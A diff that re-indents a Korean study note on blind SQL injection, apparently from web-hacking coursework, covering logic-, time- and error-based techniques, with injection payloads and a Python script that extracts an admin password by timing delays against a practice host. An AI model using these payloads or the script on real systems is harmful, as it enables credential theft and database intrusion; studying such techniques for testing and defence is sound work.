@@ -175,91 +175,98 @@ msg 파라미터를 출력하는 xss.php 예제
       */
       ```
 
-          - _Application Logic_
+      - _Application Logic_
 
-              - 데이터베이스의 결과를 받은 어플리케이션에서 결과 값에 따라 다른 행위를 수행하게 되는 점을 이용해 참과 거짓을 구분하는 방법
-              - substr(passwrod, 1, 1) 과 같은 경우 패스워드 첫번째 문자열 반환됨 이를 통해 index를 변경하며 password 전체를 획들할 수 있음
+        - 데이터베이스의 결과를 받은 어플리케이션에서 결과 값에 따라 다른 행위를 수행하게 되는 점을 이용해 참과 거짓을 구분하는 방법
+        - substr(passwrod, 1, 1) 과 같은 경우 패스워드 첫번째 문자열 반환됨 이를 통해 index를 변경하며 password 전체를 획들할 수 있음
 
-            ```
-            예시
-            /*index를 조절하여 글자 획득*/
-            upw=" union select substr(upw,1,1) from users where uid='admin'--
+        ```
+        예시
+        /*index를 조절하여 글자 획득*/
+        upw=" union select substr(upw,1,1) from users where uid='admin'--
 
-            /*한글자씩 비교해가며 성공 여부 확인*/
-            upw=" or uid="admin" and substr(upw,1,1)="p
-            ```
+        /*한글자씩 비교해가며 성공 여부 확인*/
+        upw=" or uid="admin" and substr(upw,1,1)="p
+        ```
 
-          - _Time Based_
+      - _Time Based_
 
-              - 시간 지연을 이용해 참/거짓 여부를 판단
-              - DBMS에서 제공하는 함수를 이용하거나, 무거운 연산과정을 발생시켜 쿼리 처리 시간을 지연시키는 heavy query 등 존재
+        - 시간 지연을 이용해 참/거짓 여부를 판단
+        - DBMS에서 제공하는 함수를 이용하거나, 무거운 연산과정을 발생시켜 쿼리 처리 시간을 지연시키는 heavy query 등 존재
 
-              ```
-              SELECT IF(1=1, sleep(1), 0);
-              /*
-              mysql> SELECT IF(1=1, sleep(1), 0);
-              +----------------------+
-              | IF(1=1, sleep(1), 0) |
-              +----------------------+
-              |                    0 |
-              +----------------------+
-              1 row in set (1.00 sec)
-              */
-              ```
-              - MySQL
-                  - sleep 함수
-                  - benchmark 함수 - expr 식을 count 수만큼 실행하며 시간지연이 발생
-                  - heavy query
-              - MSSQL
-                  - waitfor
-                  - heavy query
-              - SQLite
-                  - heavy query
+          ```
+          SELECT IF(1=1, sleep(1), 0);
+          /*
+          mysql> SELECT IF(1=1, sleep(1), 0);
+          +----------------------+
+          | IF(1=1, sleep(1), 0) |
+          +----------------------+
+          |                    0 |
+          +----------------------+
+          1 row in set (1.00 sec)
+          */
+          ```
 
-          - _Error Based Blind_
-              - 임의적으로 에러 발생을 일으켜 참/거짓을 판단하는 공격 기법
-              - Error Based은 에러 메시지를 통해 데이터가 출력되는 에러를 이용해야 하는 반면
-                Error Based Blind는 에러 발생 여부만 확인하면 됨
+          - MySQL
+            - sleep 함수
+            - benchmark 함수 - expr 식을 count 수만큼 실행하며 시간지연이 발생
+            - heavy query
+          - MSSQL
+            - waitfor
+            - heavy query
+          - SQLite
+            - heavy query
 
-          - _Short-circuit evaluation_
-              - 로직 연산의 원리를 이용한 방법
-              - A가 거짓이라면 B의 결과와는 상관 없이 결과가 거짓 따라서 실제롤 B식을 수행하지 않는 것을 의미
+        - _Error Based Blind_
 
-          - **Blind SQL Injection Tip-1**
-              -  ASCII에서 출력 가능한 문자의 범위는 32~126으로 총 94개 문자 존재, 따라서 최악의 경우 94번의 요청을 전송해야함
-              - 이는 비효율적이므로 다음과 같의 좀 더 효율적으로 수행하는 방법들이 존재함
+          - 임의적으로 에러 발생을 일으켜 참/거짓을 판단하는 공격 기법
+          - Error Based은 에러 메시지를 통해 데이터가 출력되는 에러를 이용해야 하는 반면
+            Error Based Blind는 에러 발생 여부만 확인하면 됨
 
-              - _Binary Search_
-                1. 범위 내의 중간 값을 지정하고 값을 비교
-                2. 지정한 값이 찾고자 하는 값과 비교하고 범위를 조절
-                3. 위 과정을 반복하여 특정한 값 찾음
+        - _Short-circuit evaluation_
 
-              - _bit 연산_
-                - ASCII는 7개의 비트를 통해 하나의 문자를 나타냄
-                - 7번의 요청을 통해 한 바이트를 획들할 수 있음
+          - 로직 연산의 원리를 이용한 방법
+          - A가 거짓이라면 B의 결과와는 상관 없이 결과가 거짓 따라서 실제롤 B식을 수행하지 않는 것을 의미
 
-          - **Blind SQL Injection Tip-2**
-              - Blind SQL Injection은 다수의 요청을 통해 결과를 획득하는 공격 기법
-              - 사용자가 직접 입력하는 방식은 물리적 한계 -> 스크립트를 작성하여 공격 수행
+        - **Blind SQL Injection Tip-1**
 
-              - 예시
-              ```
-              #!/usr/bin/env python3
-              import requests
-              URL = "http://sqltest.dreamhack.io"
-              DATA = ""
-              for index in range(1, 100):
-                for chars in range(32, 127):
-                  payload = "/?username='or if((select ord(substr(password,%s,1)) from users where username='admin')=%s, sleep(2), 0)-- -" %(index, chars)
-                  addr = URL + payload
-                  ret = requests.get(addr)
-                  loadTime = ret.elapsed.total_seconds()
-                  if loadTime > 1.9:
-                    DATA += chr(chars)
-                    print(DATA)
-                    break
-              print(DATA)
-              ```
+          - ASCII에서 출력 가능한 문자의 범위는 32~126으로 총 94개 문자 존재, 따라서 최악의 경우 94번의 요청을 전송해야함
+          - 이는 비효율적이므로 다음과 같의 좀 더 효율적으로 수행하는 방법들이 존재함
+
+          - _Binary Search_
+
+            1. 범위 내의 중간 값을 지정하고 값을 비교
+            2. 지정한 값이 찾고자 하는 값과 비교하고 범위를 조절
+            3. 위 과정을 반복하여 특정한 값 찾음
+
+          - _bit 연산_
+            - ASCII는 7개의 비트를 통해 하나의 문자를 나타냄
+            - 7번의 요청을 통해 한 바이트를 획들할 수 있음
+
+        - **Blind SQL Injection Tip-2**
+
+          - Blind SQL Injection은 다수의 요청을 통해 결과를 획득하는 공격 기법
+          - 사용자가 직접 입력하는 방식은 물리적 한계 -> 스크립트를 작성하여 공격 수행
+
+          - 예시
+
+          ```
+          #!/usr/bin/env python3
+          import requests
+          URL = "http://sqltest.dreamhack.io"
+          DATA = ""
+          for index in range(1, 100):
+            for chars in range(32, 127):
+              payload = "/?username='or if((select ord(substr(password,%s,1)) from users where username='admin')=%s, sleep(2), 0)-- -" %(index, chars)
+              addr = URL + payload
+              ret = requests.get(addr)
+              loadTime = ret.elapsed.total_seconds()
+              if loadTime > 1.9:
+                DATA += chr(chars)
+                print(DATA)
+                break
+          print(DATA)
+          ```
 
 ### SQL DML 구문에 대한 이해
 
